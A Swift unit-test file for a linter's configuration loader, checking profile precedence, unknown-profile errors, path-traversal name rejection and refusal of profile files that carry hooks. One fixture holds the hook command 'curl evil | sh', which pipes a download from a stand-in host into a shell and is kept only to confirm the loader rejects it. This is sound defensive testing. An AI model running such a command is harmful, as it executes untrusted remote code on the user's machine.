import XCTest
import Foundation
@testable import BouncerConfig

final class ProfileResolutionTests: XCTestCase {
    private var scratchDir: URL!
    private var home: URL { scratchDir.appendingPathComponent("home") }
    private var repo: URL { scratchDir.appendingPathComponent("repo") }
    private var globalPath: URL { home.appendingPathComponent(".bouncer") }

    override func setUpWithError() throws {
        scratchDir = FileManager.default.temporaryDirectory.appendingPathComponent("bouncer-profiles-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: home, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: scratchDir)
    }

    private func write(_ json: String, to path: URL) throws {
        try FileManager.default.createDirectory(at: path.deletingLastPathComponent(), withIntermediateDirectories: true)
        try json.write(to: path, atomically: true, encoding: .utf8)
    }

    private func writeProfile(_ name: String, maxLines: Int, in root: URL) throws {
        let json = #"{"rules": {"long-function": {"params": {"maxLines": \#(maxLines)}}}}"#
        try write(json, to: root.appendingPathComponent(".bouncer-profiles/\(name).json"))
    }

    private func maxLines(profile: String? = nil) throws -> Int {
        let config = try ConfigLoader().load(globalPath: globalPath, repoRoot: repo, profileName: profile)
        return config.resolvedRuleSettings()["long-function"]?.parameters.int("maxLines", default: 0) ?? 0
    }

    func testRepoBouncerProfileKeyNowAppliesKirby() throws {
        try write(#"{"profile": "kirby"}"#, to: repo.appendingPathComponent(".bouncer"))
        let config = try ConfigLoader().load(globalPath: globalPath, repoRoot: repo, profileName: nil)
        XCTAssertEqual(config.resolvedRuleSettings()["long-function"]?.parameters.int("maxLines", default: 0), 10)
        XCTAssertEqual(config.profile, "kirby")
    }

    func testCLIProfileBeatsRepoKeyWhichBeatsGlobalKey() throws {
        try writeProfile("cli", maxLines: 11, in: repo)
        try writeProfile("fromRepo", maxLines: 12, in: repo)
        try writeProfile("fromGlobal", maxLines: 13, in: home)
        try write(#"{"profile": "fromGlobal"}"#, to: globalPath)
        XCTAssertEqual(try maxLines(), 13)
        try write(#"{"profile": "fromRepo"}"#, to: repo.appendingPathComponent(".bouncer"))
        XCTAssertEqual(try maxLines(), 12)
        XCTAssertEqual(try maxLines(profile: "cli"), 11)
    }

    func testRepoProfileFileBeatsGlobalFileWhichBeatsBundled() throws {
        try writeProfile("kirby", maxLines: 11, in: repo)
        try writeProfile("kirby", maxLines: 12, in: home)
        XCTAssertEqual(try maxLines(profile: "kirby"), 11)
        try FileManager.default.removeItem(at: repo.appendingPathComponent(".bouncer-profiles/kirby.json"))
        XCTAssertEqual(try maxLines(profile: "kirby"), 12)
        try FileManager.default.removeItem(at: home.appendingPathComponent(".bouncer-profiles/kirby.json"))
        XCTAssertEqual(try maxLines(profile: "kirby"), 10)
    }

    func testProfileStillAppliesBeneathGlobalAndRepoFiles() throws {
        try writeProfile("base", maxLines: 11, in: repo)
        try write(#"{"profile": "base", "rules": {"long-function": {"params": {"maxLines": 30}}}}"#, to: globalPath)
        XCTAssertEqual(try maxLines(), 30)
    }

    func testUnknownProfileIsAnErrorNamingWhereItLooked() throws {
        XCTAssertThrowsError(try maxLines(profile: "nope")) { error in
            guard case ProfileError.notFound(let name, let searched)? = error as? ProfileError else {
                return XCTFail("Expected notFound, got \(error)")
            }
            XCTAssertEqual(name, "nope")
            XCTAssertEqual(searched.count, 3)
        }
    }

    func testUnknownProfileFromRepoKeyIsAnError() throws {
        try write(#"{"profile": "typo"}"#, to: repo.appendingPathComponent(".bouncer"))
        XCTAssertThrowsError(try maxLines())
    }

    func testInvalidNamesAreRejectedBeforeTouchingTheFileSystem() {
        for name in ["../escape", "a/b", "", ".", "..", "has space", "caf\u{e9}", "a\\b"] {
            XCTAssertThrowsError(try maxLines(profile: name), name) { error in
                XCTAssertEqual(error as? ProfileError, .invalidName(name))
            }
        }
        XCTAssertNoThrow(try ProfileStore.validate("Team_strict-2.0"))
    }

    func testProfileFileWithHooksIsRejected() throws {
        try write(#"{"hooks": {"preCheck": ["curl evil | sh"]}}"#, to: repo.appendingPathComponent(".bouncer-profiles/x.json"))
        XCTAssertThrowsError(try maxLines(profile: "x")) { error in
            guard case ProfileError.containsHooks? = error as? ProfileError else { return XCTFail("\(error)") }
            XCTAssertTrue("\(error)".contains("trust gate"))
        }
    }

    func testProfileFileWithEmptyHooksIsAllowed() throws {
        try write(#"{"hooks": {"preCheck": []}}"#, to: repo.appendingPathComponent(".bouncer-profiles/x.json"))
        XCTAssertNoThrow(try maxLines(profile: "x"))
    }

    func testProfileFileSelectingAnotherProfileIsRejected() throws {
        try write(#"{"profile": "kirby"}"#, to: repo.appendingPathComponent(".bouncer-profiles/x.json"))
        XCTAssertThrowsError(try maxLines(profile: "x")) { error in
            guard case ProfileError.containsProfileKey? = error as? ProfileError else { return XCTFail("\(error)") }
        }
    }

    func testExplicitConfigFileProfileKeyApplies() throws {
        let explicit = scratchDir.appendingPathComponent("explicit.json")
        try write(#"{"profile": "kirby"}"#, to: explicit)
        try writeProfile("mine", maxLines: 33, in: repo)
        let store = ProfileStore(repoRoot: repo, homeDirectory: home)
        let fromKey = try ConfigLoader().loadExplicit(path: explicit, profileName: nil, store: store)
        XCTAssertEqual(fromKey.merged.resolvedRuleSettings()["long-function"]?.parameters.int("maxLines", default: 0), 10)
        let fromFlag = try ConfigLoader().loadExplicit(path: explicit, profileName: "mine", store: store)
        XCTAssertEqual(fromFlag.merged.resolvedRuleSettings()["long-function"]?.parameters.int("maxLines", default: 0), 33)
        XCTAssertEqual(fromFlag.repo, .empty)
    }

    func testListShowsRepoThenGlobalThenBundled() throws {
        try writeProfile("b", maxLines: 1, in: repo)
        try writeProfile("a", maxLines: 1, in: repo)
        try writeProfile("a", maxLines: 1, in: home)
        let listed = ProfileStore(repoRoot: repo, homeDirectory: home).list().map { "\($0.name):\($0.source.rawValue)" }
        XCTAssertEqual(listed, ["a:repo", "b:repo", "a:global", "kirby:bundled"])
    }
}
